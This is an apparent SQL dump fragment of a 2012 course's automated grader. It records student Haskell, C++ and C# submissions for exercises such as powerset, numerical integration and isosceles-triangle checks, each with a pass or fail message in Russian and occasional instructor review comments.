(1174, 43, 'hasp', '2012-09-29 22:24:33', 1, 'extendedE _ 0 x _ y _ = (x,y)\r\nextendedE a b x flipX y flipY = extendedE b (a `mod` b) flipX (x - (a `div` b)*flipX) flipY (y - (a `div` b)*flipY)\r\n\r\neuclid a b = extendedE a b 1 0 0 1', '<br/>Тесты успешно пройдены!'),
(1175, 44, 'hasp', '2012-09-29 22:24:52', 0, 'solveSys 0 _ _ 0  _  _ = ((0,0), False)\r\nsolveSys x y z x1 y1 z1 = if x /= 0 then let bb = (z1 - (x1/x)*z)/(y1 - y*(x1/x)) in (((z-bb*y)/x, bb), True) else solveSys x1 y1 z1 x y z\r\n\r\ndioph (a:b:c:d:[]) (k:l:m:n:[]) = let f1 = solveSys a b d k l n in \r\n								  let f2 = solveSys a c d k m n in\r\n								  let f3 = solveSys b c d l m n in \r\n								  if snd f1 then let f11 = fst f1 in (fst f11, snd f11, 0) else\r\n									if snd f2 then let f12 = fst f2 in (fst f12, 0, snd f12) else\r\n										let f13 = fst f3 in (0, fst f13, snd f13)', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1176, 44, 'hasp', '2012-09-29 22:28:07', 0, 'solveSys 0 _ _ 0  _  _ = ((0,0), False)\r\nsolveSys x y z x1 y1 z1 = if x /= 0 then let bb = (z1 - (x1/x)*z)/(y1 - y*(x1/x)) in (((z-bb*y)/x, bb), True) else solveSys x1 y1 z1 x y z\r\n\r\ndioph (a:b:c:d:[]) (k:l:m:n:[]) = let f1 = solveSys a b d k l n in \r\n								  let f2 = solveSys a c d k m n in\r\n								  let f3 = solveSys b c d l m n in \r\n								  if snd f1 then let f11 = fst f1 in (fst f11):(snd f11):0:[] else\r\n									if snd f2 then let f12 = fst f2 in (fst f12):0:(snd f12):[] else\r\n										let f13 = fst f3 in 0:(fst f13):(snd f13):[]', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)'),
(1177, 44, 'hasp', '2012-09-29 22:30:58', 0, 'solveSys 0 _ _ 0  _  _ = ((0,0), False)\r\nsolveSys x y z x1 y1 z1 = if x  /= 0 then let bb = (z1 - (x1 `div` x)*z) `div` (y1 - y*(x1 `div` x)) in (((z-bb*y) `div` x, bb), True) else solveSys x1 y1 z1 x y z\r\n\r\ndioph (a:b:c:d:[]) (k:l:m:n:[]) = let f1 = solveSys a b d k l n in \r\n								  let f2 = solveSys a c d k m n in\r\n								  let f3 = solveSys b c d l m n in \r\n								  if snd f1 then let f11 = fst f1 in (fst f11):(snd f11):0:[] else\r\n									if snd f2 then let f12 = fst f2 in (fst f12):0:(snd f12):[] else\r\n										let f13 = fst f3 in 0:(fst f13):(snd f13):[]', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z", проверьте правильность синтаксиса'),
(1178, 44, 'hasp', '2012-09-29 22:39:44', 2, 'solveSys 0 _ _ 0  _  _ = ((0,0), False)\r\nsolveSys x y z x1 y1 z1 = let k = (y1 - y*(x1 `div` x)) in if x  /= 0 && k /= 0 then let bb = (z1 - (x1 `div` x)*z) `div` k in \r\n							(((z-bb*y) `div` x, bb), True) else if k /= 0 then solveSys x1 y1 z1 x y z else ((0,0),False)\r\n\r\ndioph (a:b:c:d:[]) (k:l:m:n:[]) = let f1 = solveSys a b d k l n in \r\n								  let f2 = solveSys a c d k m n in\r\n								  let f3 = solveSys b c d l m n in \r\n								  if snd f1 then let f11 = fst f1 in (fst f11):(snd f11):0:[] else\r\n									if snd f2 then let f12 = fst f2 in (fst f12):0:(snd f12):[] else\r\n										if snd f3 then let f13 = fst f3 in 0:(fst f13):(snd f13):[] else [1,1,d - 2]', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [25,33,0,1] [1,0,1,0] in (25*x+33*y, x+z)'),
(1179, 34, 'erwert', '2012-09-29 23:41:25', 0, '#include <iostream>\r\n#include <stdio.h>\r\n\r\nusing namespace std;\r\n\r\ntemplate <class Func>\r\nvoid integration(Func f, int a, int b){\r\n	double h = ((double) b - (double) a) / 100;\r\n	double sum = 0;\r\n	for(int i = 0; i < 100; i++)\r\n		sum += h * (f(h*i + a) + f(h*(i+1) + a));\r\n	cout << sum / 2 << endl;\r\n}\r\n\r\ndouble f(double x){\r\n	return x * x;\r\n}\r\n\r\nint main(){\r\n	integration(f,0,1);\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1180, 33, 'erwert', '2012-09-30 00:30:27', 1, 'namespace Int {\r\n	class Integrale {\r\n\r\n		static void integral(Func<double, double> f, double a, double b) {\r\n			double h = (b - a) / 100;\r\n			double sum = 0;\r\n			for(int i = 0; i < 100; i++)\r\n				sum += h * (f(i*h + a) + f((i+1)*h + a));\r\n			System.Console.WriteLine("{0}", sum / 2);\r\n		}\r\n			\r\n		public static void Main(){\r\n			integral( x => x*x, 0, 1);	\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1181, 30, '16265158', '2012-09-30 02:16:08', 1, '\r\n-- initialize NOM and getting a tile\r\n\r\ninc_part i [] = (0, [])\r\n\r\ninc_part i [a] = (i, [])\r\n\r\ninc_part i (c:h:t) \r\n\r\n	| c<h = inc_part (i+1) (h:t)\r\n\r\n	| otherwise = (i, (h:t))\r\n\r\n		\r\n\r\n--\r\n\r\nnext_part before_val [] = before_val\r\n\r\nnext_part before_val tail_part\r\n\r\n	| cur_val < 2 = cur_val\r\n\r\n	| otherwise = next_part (gcd before_val cur_val) new_tail\r\n\r\n	where (cur_val, new_tail) = inc_part 1 tail_part\r\n\r\n\r\n\r\n-- main function\r\n\r\nparts list = \r\n\r\n	(next_part i t) > 1\r\n\r\n	where (i, t) = inc_part 1 list\r\n\r\n	\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1182, 31, '16265158', '2012-09-30 02:55:34', 1, '\r\n-- Fedor Burdun -- SPbSU 2012\r\n\r\n\r\n\r\nparts2 list \r\n\r\n	| mod list_len 2 /= 0 = False\r\n\r\n	| otherwise = take 0 0 0 0 list\r\n\r\n	where\r\n\r\n		list_len = length list\r\n\r\n		len_half = div list_len 2\r\n\r\n\r\n\r\n		take a_last a_len b_last b_len [] = a_len == b_len\r\n\r\n		take a_last a_len b_last b_len (h:t)\r\n\r\n			| a_len > len_half || b_len > len_half = False\r\n\r\n			| otherwise = p1 || p2 || p3 || p4\r\n\r\n			where\r\n\r\n				p1 = a_len == 0 && take h 1 b_last b_len t\r\n\r\n				p2 = b_len == 0 && take a_last a_len 1 h t\r\n\r\n				p3 = a_last < h && take h (a_len+1) b_last b_len t\r\n\r\n				p4 = b_last < h && take a_last a_len h (b_len+1) t\r\n\r\n			\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1183, 48, '517309', '2012-09-30 03:34:18', 3, 'myreverse = reverse', '<br/>Тесты успешно пройдены!'),
(1184, 47, '517309', '2012-09-30 03:35:12', 0, 'powerset xs = foldr (x res -> res ++ map (x:) res) [[]] xs', '<br/>Тесты успешно пройдены!'),
(1185, 47, '517309', '2012-09-30 03:39:25', 3, 'powerset xs = foldr (x res -> res ++ map (x:) res) [[]] xs', '<br/>Тесты успешно пройдены!'),
(1186, 47, '3431532', '2012-09-30 07:57:04', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = [x:sublist | sublist <- powerset xs] ++ powerset xs\r\n', '<br/>Тесты успешно пройдены!'),
(1187, 47, '397095', '2012-09-30 08:36:32', 1, 'powerset xs = map (inv []) (ps [[]] xs)\r\n\r\nps rs [] = rs\r\nps rs (x:xs) = ps (it rs [] x) xs\r\n\r\nit [] ls _ = ls\r\nit (r:rs) ls x = it rs (r:(x:r):ls) x\r\n\r\ninv ys [] = ys\r\ninv ys (x:xs) = inv (x:ys) xs', '<br/>Тесты успешно пройдены!'),
(1188, 33, '383483', '2012-09-30 09:00:33', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace PrintTable\r\n{\r\n    class Program\r\n    {\r\n        static double integralCalc(Func<double, double> f, double a, double b)\r\n        {\r\n            double result = 0;\r\n            double c = (b - a) / 1000;\r\n            for (double i = a; i <= b; i+=c)\r\n                     // ### Мне кажется лучше i < b - иначе у вас получится один лишний прямоугольник в конце\r\n            {\r\n                result += c * f(i);\r\n            }\r\n            return result;\r\n        }\r\n\r\n        static Func<double, double> sqr = i => i * i;\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            //Примеры вызова:\r\n            Console.WriteLine(integralCalc(sqr, 0, 1.0));\r\n            Console.WriteLine(integralCalc(i=>i*5+4, 0, 1.0));\r\n            Console.WriteLine(integralCalc(i=>i*i*i, 0, 9.0));\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1189, 47, '12206137', '2012-09-30 09:15:56', 0, '-- Я не понял, нужно ли проверять добиваться уникальности (например, для списка [1 1] ответ содержит [1] один раз или два).\r\n-- Сейчас я этого не делаю.\r\npowerset [] = [[]]\r\npowerset (x:xs) =\r\n    let tailRes = powerset xs in\r\n    tailRes ++ map (list -> x:list) tailRes', '<br/>Тесты успешно пройдены!'),
(1190, 47, '12206137', '2012-09-30 09:17:00', 1, 'powerset [] = [[]]\r\n\r\npowerset (x:xs) =\r\n\r\n    let tailRes = powerset xs in\r\n\r\n    tailRes ++ map (list -> x:list) tailRes\r\n', '<br/>Тесты успешно пройдены!'),
(1191, 34, '383483', '2012-09-30 09:49:39', 1, '#include "stdafx.h"\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\ntemplate <class Func>\r\nfloat integral(Func f, double a, double b)\r\n{\r\n	double result = 0;\r\n    double c = (b - a) / 10000;\r\n    for (double i = a; i <= b; i += c)\r\n	{\r\n		result += c * f(i);\r\n	}\r\n	return result;\r\n}\r\n\r\nint cube(int i)\r\n{\r\n	return i*i*i;\r\n}\r\n\r\nint main()\r\n{\r\n	// Примеры вызовов:\r\n    cout << integral(cube, 0, 20.0)<<"\r\n";\r\n	cout << integral([] (double i) {return i*i; }, 0, 10.0)<<"\r\n";\r\n	cout << integral([] (double i) {return 5*i*i+12*i+3; }, 0, 10.0);\r\n\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1192, 48, '12206137', '2012-09-30 10:17:43', 1, 'myreverse x = fst $ foldr (\\_ (res, x:xs) -> (x:res, xs)) ([],x) x', '<br/>Тесты успешно пройдены!'),
(1193, 47, '63706456', '2012-09-30 14:20:17', 1, 'powerset [] = [[]]\r\npowerset (x:xs) = foldr (ls xs-> (ls:(x:ls):xs)) [] $ powerset xs\r\n--решение не учитывает того, что в списке м.б. повторяющиеся элементы\r\n   --- ОК, хорошее замечание, но думаю у меня более-менее корректно сформулировано,\r\n   --- например для списка [2,3,2] - подсписки - это [[],[2],[3],[2],[2,3],[2,2],[3,2],[2,3,2]]\r\n   --- и ничего, что один список [2] повторяется два раза - это как бы разные подсписки.\r\n   --- Те, если коротко, по моему у вас совершенно правильное решение)\r\n', '<br/>Тесты успешно пройдены!'),
(1194, 34, '419046', '2012-09-30 14:25:13', 1, '#include "stdafx.h"\r\n\r\n\r\n\r\n#include <iostream>\r\n\r\n \r\n\r\nusing namespace std;\r\n\r\n \r\n\r\ntemplate <class Func>\r\n\r\ndouble integral(Func f, double a, double b)\r\n\r\n{\r\n\r\n	int n = 100;\r\n\r\n	double res = 0;\r\n\r\n	double h;\r\n\r\n	h = (b-a)/n;\r\n\r\n       	 for (int i = 0; i < n; i++)\r\n\r\n		res+=h*f(a+i*h);     \r\n\r\nreturn res;\r\n\r\n}\r\n\r\n \r\n\r\n \r\n\r\ndouble square(double i)\r\n\r\n{\r\n\r\n        return i*i;\r\n\r\n}\r\n\r\n \r\n\r\ndouble cube(double i)\r\n\r\n{\r\n\r\n        return i*i*i;\r\n\r\n}\r\n\r\n \r\n\r\nint main()\r\n\r\n{\r\n\r\n        \r\n\r\n        cout<<integral(square, 0, 1)<<endl;\r\n\r\n        cout<<integral(cube, 0, 1)<<endl;\r\n\r\n        double result = integral([] (double i) -> double\r\n\r\n                           { \r\n\r\n                                   return 2*i; \r\n\r\n                           }, \r\n\r\n                           0, 1);\r\n\r\n \r\n\r\n        cout<<result<<endl;\r\n\r\n \r\n\r\n        return 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1195, 33, '419046', '2012-09-30 14:51:08', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n \r\n\r\nnamespace PrintTable\r\n\r\n{\r\n\r\n    class Integral\r\n\r\n    {\r\n\r\n        static double integral(Func<double, double> f, double a, double b)\r\n\r\n        {\r\n\r\n        int n = 100;\r\n\r\n        double res = 0;\r\n\r\n        double h;\r\n\r\n        h = (b-a)/n;\r\n\r\n                for (int i = 0; i < n; i++)\r\n\r\n                        {\r\n\r\n                                res=res+h*f(a+i*h); \r\n\r\n                        }    \r\n\r\n        return res;\r\n\r\n \r\n\r\n        }\r\n\r\n \r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n           double res1 = integral(i => i*i, 0, 1);\r\n\r\n           double res2 = integral(i => i*i*i, 0, 1);\r\n\r\n                Console.WriteLine("{0} {1}", res1, res2);\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1196, 47, '3607492', '2012-09-30 15:21:18', 0, 'firsts [] = []:[]\r\nfirsts (x:xs) = [] : map (x :) (firsts xs)\r\n\r\nlasts [] = []\r\nlasts (x:xs) = (x:xs):lasts xs\r\n\r\npowerset z =[]:[x| y<- firsts z, x<-lasts y]\r\n', 'Выражение имеет неправильное значение: length (powerset [1,2,3])'),
(1197, 34, 'erwert', '2012-09-30 15:27:12', 1, '#include <iostream>\r\n\r\n#include <stdio.h>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\ntemplate <class Func>\r\n\r\nvoid integral(Func f, double a, double b){\r\n\r\n	double h = (b - a) / 100;\r\n\r\n	double p, t = f(a);\r\n\r\n	double sum = 0;\r\n\r\n	for(int i = 1; i < 100; i++){\r\n\r\n		p = f(h*i + a);\r\n\r\n		sum += h * (t + p);\r\n\r\n		t = p;\r\n\r\n	}\r\n\r\n	cout << sum / 2 << endl;\r\n\r\n}\r\n\r\n\r\n\r\ndouble f(double x){\r\n\r\n	return x * x;\r\n\r\n}\r\n\r\n\r\n\r\nint main(){\r\n\r\n	integral(f,0,1);\r\n\r\n	integral([](double) { return 3*x; }, 0, 3);\r\n\r\n	return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1198, 47, '3607492', '2012-09-30 15:38:13', 1, 'set [] = []\r\nset (z:zs) =[z]:foldr (a b->a:(z:a):b) [] (set zs)\r\n\r\n\r\npowerset z = []:(set z)', '<br/>Тесты успешно пройдены!'),
(1199, 35, '1730564', '2012-09-30 15:38:51', 1, 'isosc a b c = isosc1 (len2 a b) (len2 a c) (len2 b c)\r\n\r\nisosc1 a b c = a == b || a == c || b == c\r\n\r\nlen2 (x1, y1) (x2, y2) = sqr (x2 - x1) + sqr (y2 - y1)\r\n\r\nsqr x = x * x\r\n', '<br/>Тесты успешно пройдены!'),
(1200, 36, '1730564', '2012-09-30 15:39:22', 1, 'cubeTable n = [(x, x * x * x) | x <-[1..n]]', '<br/>Тесты успешно пройдены!'),
(1201, 37, '1730564', '2012-09-30 15:40:00', 1, 'minsum [] = error "empty list"\r\nminsum (head : []) = error "wrong input"\r\nminsum a@(head : tail) = minimum(zipWith (+) a tail)', '<br/>Тесты успешно пройдены!'),
(1202, 38, '1730564', '2012-09-30 15:41:01', 1, 'data Node = Node Int Node Node | Empty\r\n\r\nheight a = height'' a 0\r\n\r\nheight'' Empty n = n - 1\r\nheight'' (Node a left right) n = max (height'' left (n + 1)) (height'' right (n + 1))', '<br/>Тесты успешно пройдены!'),
(1203, 31, '3607492', '2012-09-30 15:50:40', 0, 'check [] a b = (length a== length b)\r\ncheck (x:xs) a b = do\r\n				   if (    ( a==[] || x<(head a) && length a < length xs)      && (    b==[] || x<(head b) && length b < length xs )     )\r\n				   then (check xs (x:a) b || check xs a (x:b))\r\n				   else if (a==[] || x<(head a) && length a < length xs)\r\n		 				then  (check xs (x:a) b) \r\n		 				else if (b==[] || x<(head b)  && length b < length xs)\r\n		 	  				 then  (check xs a (x:b)) \r\n		 	  				 else  False\r\n\r\nparts2 x =  check (reverse x) [] []', 'Выражение имеет неправильное значение: parts2 [1, 3, 1, 8, 4, 9]'),
(1204, 31, '3607492', '2012-09-30 15:52:20', 1, 'check [] a b z = (length a== length b)\r\ncheck (x:xs) a b z = do\r\n				   if (    ( a==[] || x<(head a) && length a < z)      && (    b==[] || x<(head b) && length b < z )     )\r\n				   then (check xs (x:a) b z || check xs a (x:b) z)\r\n				   else if (a==[] || x<(head a) && length a < z)\r\n		 				then  (check xs (x:a) b z) \r\n		 				else if (b==[] || x<(head b)  && length b < z)\r\n		 	  				 then  (check xs a (x:b) z) \r\n		 	  				 else  False\r\n\r\nparts2 x =  check (reverse x) [] [] (div (length x) 2)', '<br/>Тесты успешно пройдены!'),
(1205, 39, '1730564', '2012-09-30 16:06:36', 1, 'data Node = Node Int Node Node | Empty\r\n\r\nminHeight a = minHeight'' [a] [] 0\r\n\r\nminHeight'' [] [] d = 0\r\nminHeight'' [] list d = minHeight'' list [] (d + 1)\r\nminHeight'' ((Node a Empty Empty) : tail) list d = d\r\nminHeight'' ((Node a left Empty) : tail) list d = minHeight'' tail (left : list) d\r\nminHeight'' ((Node a Empty right) : tail) list d = minHeight'' tail (right : list) d\r\nminHeight'' ((Node a left right) : tail) list d = minHeight'' tail (left : right : list) d\r\n\r\n\r\nminHeight2 a = minHeight'''' a 0 100000\r\n\r\nminHeight'''' Empty cur m = (cur - 1)\r\nminHeight'''' (Node a left right) cur m | cur >= m = m\r\n                                      | otherwise = minHeight'''' right (cur + 1) m2\r\n                                                    where m2 = minHeight'''' left (cur + 1) m\r\n', '<br/>Тесты успешно пройдены!'),
(1206, 40, '1730564', '2012-09-30 16:07:34', 1, 'frame n = [ [ if i == 1 || j == 1 || i == n || j == n then 1 else 0 | i <- [1..n] ] | j <- [1..n] ]\r\n', '<br/>Тесты успешно пройдены!'),
(1207, 41, '1730564', '2012-09-30 16:08:21', 1, 'countOdd [] = 0\r\n   --- Это совершенно лишнее, foldr и так даст правильный результат (и во второй функции тоже)\r\ncountOdd x      = foldr ((+) . (x -> if mod x 2 == 0 then 0 else 1)) 0 x\r\n    --- Или то же но короче\r\n    ---   countOdd x = foldr ((+) . (x -> mod x 2)) 0 x\r\n    --- ну или еще короче\r\n    ---   countOdd = foldr ((+) . (`mod` 2)) 0\r\n\r\ncountOdd1 [] = 0\r\ncountOdd1 x = sum (map (x -> if mod x 2 == 0 then 0 else 1) x)', '<br/>Тесты успешно пройдены!'),
(1208, 42, '1730564', '2012-09-30 16:13:15', 1, 'myfoldl f a [] = a\r\nmyfoldl f a (head : tail) = myfoldl f (f a head) tail\r\n', '<br/>Тесты успешно пройдены!'),
(1209, 34, '1730564', '2012-09-30 16:18:53', 1, '#include <cstdio>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nconst int N = 1000;\r\n\r\ntemplate <class F>\r\ndouble integrate(F f, double left, double right) {\r\n        double s = 0;\r\n        double step = (right - left) / N;\r\n\r\n        for (int i = 0; i != N; ++i) {\r\n                s += f(left + i * step);\r\n        }\r\n        s += f(right);\r\n        return s / (N + 1);\r\n}\r\n\r\n\r\nint main() {\r\n        cout << integrate([] (double i) { return i; }, 1, 2) << endl;\r\n\r\n        cout << integrate([] (double i) { return i * i; }, 1, 2) << endl;\r\n\r\n        return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1210, 33, '1730564', '2012-09-30 16:39:25', 1, 'using System;\r\n\r\nclass Integrator\r\n{\r\n        public static int N = 1000;\r\n        public static double integrate(Func<Double, Double> f, double left, double right) {\r\n                double s = 0;\r\n                double step = (right - left) / N;\r\n\r\n                for (int i = 0; i != N; ++i) {\r\n                        s += f(left + i * step);\r\n                }\r\n                s += f(right);\r\n                return s / (N + 1);\r\n        }\r\n\r\n        static void Main() {\r\n                Console.WriteLine(integrate(x => x, 0, 1));\r\n                Console.WriteLine(integrate(x => x * x, 0, 1));\r\n        }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1211, 33, '16265158', '2012-09-30 16:40:30', 1, 'using System;\r\n\r\n\r\n\r\nnamespace Application\r\n\r\n{\r\n\r\n	public class Task\r\n\r\n	{\r\n\r\n		private const double STEP_QUANTITY = 100;\r\n\r\n		\r\n\r\n		public static double integral(Func<double, double> fun, double s, double f) {\r\n\r\n			double delta = (f-s)/STEP_QUANTITY;\r\n\r\n			double result = 0;\r\n\r\n			for (long i = 0; i < STEP_QUANTITY; ++i) {\r\n\r\n				result += delta * fun(s + delta/2 + i*delta);\r\n\r\n			}\r\n\r\n			return result;\r\n\r\n		}\r\n\r\n		\r\n\r\n		static public void Main ()\r\n\r\n		{\r\n\r\n			double result = integral(x => x*x, 0, 1);\r\n\r\n			Console.WriteLine(result);				\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1212, 44, 'Deutsche', '2012-09-30 16:49:41', 1, 'This problem was sent by email, accept it please', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1213, 34, '16265158', '2012-09-30 16:54:38', 1, '\r\n#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nconst int STEP_QUANTITY = 100;\r\n\r\n\r\n\r\ntemplate <class Func>\r\n\r\ndouble integral(Func func, double b, double e) {\r\n\r\n	double result = 0;\r\n\r\n	double delta = (e-b)/STEP_QUANTITY;\r\n\r\n	for (int i=0; i<STEP_QUANTITY; ++i) {\r\n\r\n		result += delta * func(b + delta/2 + i*delta);\r\n\r\n	}\r\n\r\n	return result;\r\n\r\n}\r\n\r\n\r\n\r\nint main() {\r\n\r\n	double result = integral([](double x){ return x*x ; }, 0, 1);\r\n\r\n	cout << result << std::endl;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1214, 35, '16265158', '2012-09-30 17:32:35', 1, '\r\nisosc a b c =\r\n\r\n	isoscin a b c || isoscin a c b || isoscin b a c || isoscin b c a || isoscin c a b || isoscin c b a\r\n\r\n	where\r\n\r\n		isoscin (x1,y1) (x2,y2) (x3,y3) =\r\n\r\n			-- they aren''t on one line and length of sides are the same\r\n\r\n			vmult left right /= 0 && len left == len right\r\n\r\n			where\r\n\r\n				left = (x2-x1, y2-y1)\r\n\r\n				right = (x3-x1, y3-y1)\r\n\r\n				vmult (xx1,yy1) (xx2,yy2) = xx1*yy2 - xx2*yy1\r\n\r\n				len (x,y) = x*x + y*y\r\n\r\n\r\n', 'Выражение имеет неправильное значение: isosc (0, 0) (0, 10) (0, -10)'),
(1215, 35, '419046', '2012-09-30 17:35:27', 0, 'square n = n * n\r\nisosc (a1,b1) (a2,b2) (a3,b3) = \r\n                               if (sqrt (square (a1 - a2) + square (b1 - b2)) == sqrt (square (a2 - a3) + square (b2 - \r\n\r\nb3))) || (sqrt (square (a1 - a2) + square (b1 - b2)) == sqrt (square (a1 - a3) + square (b1 - b3))) || (sqrt (square (a1 \r\n\r\n- a3) + square (b1 - b3)) == sqrt (square (a2 - a3) + square (b2 - b3)))\r\n                               then True\r\n                               else False', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1216, 35, '419046', '2012-09-30 17:36:14', 1, 'square n = n * n\r\n\r\nisosc (a1,b1) (a2,b2) (a3,b3) = \r\n\r\n                               if (sqrt (square (a1 - a2) + square (b1 - b2)) == sqrt (square (a2 - a3) + square (b2 - b3))) || (sqrt (square (a1 - a2) + square (b1 - b2)) == sqrt (square (a1 - a3) + square (b1 - b3))) || (sqrt (square (a1 - a3) + square (b1 - b3)) == sqrt (square (a2 - a3) + square (b2 - b3)))\r\n\r\n                               then True\r\n\r\n                               else False\r\n', '<br/>Тесты успешно пройдены!'),
(1217, 36, '16265158', '2012-09-30 17:43:35', 0, '\n\nisosc a b c =\n\n	isoscin a b c || isoscin a c b || isoscin b a c || isoscin b c a || isoscin c a b || isoscin c b a\n\n	where\n\n		isoscin (x1,y1) (x2,y2) (x3,y3) =\n\n			-- they aren''t on one line and length of sides are the same\n\n			vmult left right /= 0 && len left == len right\n\n			where\n\n				left = (x2-x1, y2-y1)\n\n				right = (x3-x1, y3-y1)\n\n				vmult (xx1,yy1) (xx2,yy2) = xx1*yy2 - xx2*yy1\n\n				len (x,y) = x*x + y*y\n\n\n', 'Не удалось вычислить выражение "cubeTable 4", проверьте правильность синтаксиса'),
(1218, 36, '16265158', '2012-09-30 17:44:58', 1, '\r\ncubeTable n = [ (i, i*i*i) | i<-[1..n] ]\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1219, 37, '16265158', '2012-09-30 18:19:20', 1, '\r\nminsum [] = error "Undefined behaviour"\r\n\r\nminsum [a] = error "Undefined behaviour"\r\n\r\nminsum (h:h2:list) =\r\n\r\n	fst (foldr f (h+h2,h2) list)\r\n\r\n	where\r\n\r\n		f b (m, a) = (min m (a+b), b)\r\n\r\n	\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1220, 30, '44060', '2012-09-30 18:21:00', 1, 'parts [] = False\r\nparts [h] = False\r\nparts (x : xs) = f (xs) [] 1 x\r\nf [] (a) b c = g (b : a)\r\nf (x : xs) (a) b c = if c >= x  then f (xs) (b : a) 1 x\r\n		    else f (xs) (a) (b + 1) x\r\ng [x] = True\r\ng (x : c : a) = if length (a) == 0 then gcd x c >1\r\n	      else g ( (gcd x c) : a)', '<br/>Тесты успешно пройдены!'),
(1221, 40, '16265158', '2012-09-30 18:39:17', 1, '\r\nframe n =\r\n\r\n	[ frame_line n i | i <- [1..n] ]\r\n\r\n	where \r\n\r\n		frame_line n i\r\n\r\n			| i == 1 || i == n = repeat n 1\r\n\r\n			| otherwise = [1] ++ (repeat (n-2) 0) ++ [1] ++ []\r\n\r\n			where\r\n\r\n				repeat n a = [a | i <- [1..n]] -- don''t know how write it shorter.\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1222, 33, '329842', '2012-09-30 18:42:42', 2, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace Integral\r\n{\r\n    class Program\r\n    {\r\n        private const int NUMBER_OF_PARTS = 10000;\r\n\r\n        static void Integral(Func<double, double> f, double a, double b)\r\n        {\r\n            double result = 0;\r\n            double h = (b - a) / NUMBER_OF_PARTS;\r\n            for (int i = 0; i < NUMBER_OF_PARTS; i++)\r\n            {\r\n                double start = a + i * h;\r\n                result += h * f(start + h / 2);\r\n            }\r\n            Console.WriteLine("Integral = " + result.ToString("N3"));\r\n              ### В принципе все правильно, но давайте я вас попрошу немного переписать.\r\n              ### В данном случае, конечно лучше, чтобы эта функция только возвращала результат,\r\n              ### а печатать его надо в main.\r\n              ### (Ведь очень может быть вы заходите еще что-то сделать с результатом \r\n              ### (возвести в квадрат, например)\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Integral(i => i*i, 1, 10);\r\n            Integral(i => i*i*i, 2, 5);\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1223, 41, '16265158', '2012-09-30 18:49:34', 0, '\n\noddCount list =\n\n	foldr f 0 list\n\n	where \n\n		f elem count\n\n			| odd elem = count + 1\n\n			| otherwise = count\n\n\n\noddCount1 list =\n\n	length (filter odd list)\n\n\n', 'Не удалось вычислить выражение "countOdd [2, 3, 4, 8, 5, 33, 9]", проверьте правильность синтаксиса'),
(1224, 41, '16265158', '2012-09-30 18:51:18', 1, '\r\ncountOdd list =\r\n\r\n	foldr f 0 list\r\n\r\n	where \r\n\r\n		f elem count\r\n\r\n			| odd elem = count + 1\r\n\r\n			| otherwise = count\r\n\r\n\r\n\r\ncountOdd1 list =\r\n\r\n	length (filter odd list)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1225, 34, '329842', '2012-09-30 18:51:50', 2, '   #### Тут то же замечание, что и в 5.1 - исправьте, пожалуйста.\r\n#include "stdafx.h"\r\n\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nconst int NUMBER_OF_PARTS = 10000;\r\n\r\ntemplate <class Func>\r\nvoid integral(Func f, double a, double b)\r\n{\r\n	double result = 0;\r\n	double h = (b - a) / NUMBER_OF_PARTS;\r\n	for (int i = 0; i < NUMBER_OF_PARTS; i++)\r\n	{\r\n		double start = a + i * h;\r\n		result += h * f(start + h / 2);\r\n	}\r\n	cout <<"Integral = " << result << "\r\n";\r\n}\r\n\r\nint main()\r\n{\r\n	integral([] (double i) { return i*i; }, 1, 10);\r\n\r\n	auto cube = [] (double i) { return i*i*i; };\r\n	integral(cube, 2, 5);\r\n\r\n	int p;\r\n	cin >> p;\r\n\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
